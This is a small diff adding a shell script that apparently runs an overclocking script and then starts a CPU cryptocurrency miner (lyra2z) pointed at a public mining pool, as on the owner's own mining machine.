@@ -1,0 +1,4 @@
+# catchsegv
+/root/overclock.sh
+nice -n -20 /root/miner/cpuminer-xzc/cpuminer -a lyra2z -o stratum+tcp://us-east.lyra2z-hub.miningpoolhub.com:20581 -u jojapoppa.40 -p x -D &
+
